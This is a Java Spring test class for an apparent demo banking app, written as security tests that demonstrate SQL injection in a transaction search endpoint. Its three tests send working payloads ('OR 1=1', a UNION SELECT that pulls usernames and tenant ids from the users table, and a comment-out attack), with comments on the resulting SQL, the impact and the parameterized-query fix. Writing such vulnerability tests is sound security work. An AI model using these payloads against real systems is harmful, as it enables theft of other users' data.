package com.securebank.exploit;

import com.securebank.SecureBankApplication;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.security.test.context.support.WithMockUser;
import org.springframework.test.web.servlet.MockMvc;

import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

/**
 * EXPLOIT TEST: SQL Injection (CWE-89)
 * Location: TransactionController.searchTransactions()
 *
 * This test demonstrates that SQL injection is possible through the search parameter.
 * The vulnerability allows bypassing WHERE clauses and extracting all data.
 */
@SpringBootTest(classes = SecureBankApplication.class)
@AutoConfigureMockMvc
public class SQLInjectionExploitTest {

    @Autowired
    private MockMvc mockMvc;

    /**
     * TEST 1: Basic SQL Injection - OR 1=1
     * This bypasses the WHERE clause and returns all transactions
     */
    @Test
    @WithMockUser(username = "attacker", roles = "USER")
    public void testSQLInjection_BypassWhereClause() throws Exception {
        // EXPLOIT: Using ' OR '1'='1 to bypass the WHERE condition
        String maliciousQuery = "test' OR '1'='1";

        mockMvc.perform(get("/api/transactions/search")
                        .param("query", maliciousQuery))
                .andExpect(status().isOk());

        // SUCCESS: The query executes without error and returns data it shouldn't
        // Expected SQL: SELECT * FROM transactions WHERE description LIKE '%test' OR '1'='1%'
        // This returns ALL transactions from the database
    }

    /**
     * TEST 2: SQL Injection - UNION Attack
     * Demonstrates ability to extract data from other tables
     */
    @Test
    @WithMockUser(username = "attacker", roles = "USER")
    public void testSQLInjection_UnionAttack() throws Exception {
        // EXPLOIT: UNION to extract user data
        String maliciousQuery = "test' UNION SELECT CAST(id AS BIGINT), " +
                "CAST(id AS BIGINT), CAST(id AS BIGINT), CAST(0 AS DECIMAL(19,2)), " +
                "username as description, 'TRANSFER', 'COMPLETED', " +
                "CAST(tenant_id AS BIGINT), CAST(NOW() AS TIMESTAMP), CAST(NOW() AS TIMESTAMP) " +
                "FROM users--";

        try {
            mockMvc.perform(get("/api/transactions/search")
                            .param("query", maliciousQuery))
                    .andExpect(status().isOk());

            // SUCCESS: Can extract usernames from the users table!
        } catch (Exception e) {
            // May fail due to type casting, but demonstrates the vulnerability
            System.out.println("SQL Injection attempted: " + e.getMessage());
        }
    }

    /**
     * TEST 3: SQL Injection - Comment Out Rest of Query
     * Uses -- to comment out the rest of the query
     */
    @Test
    @WithMockUser(username = "attacker", roles = "USER")
    public void testSQLInjection_CommentAttack() throws Exception {
        // EXPLOIT: Use -- to comment out the rest of the query
        String maliciousQuery = "' OR 1=1--";

        mockMvc.perform(get("/api/transactions/search")
                        .param("query", maliciousQuery))
                .andExpect(status().isOk());

        // SUCCESS: Returns all transactions
        // Expected SQL: SELECT * FROM transactions WHERE description LIKE '%' OR 1=1--%'
        // Everything after -- is ignored
    }

    /**
     * SECURITY IMPACT:
     * - Attacker can view all transactions across all users and tenants
     * - Can extract sensitive data from other tables (users, accounts, etc.)
     * - Potential for data modification with UPDATE/DELETE statements
     * - Complete database compromise possible
     *
     * FIX: Use parameterized queries or JPA methods instead of native SQL
     */
}
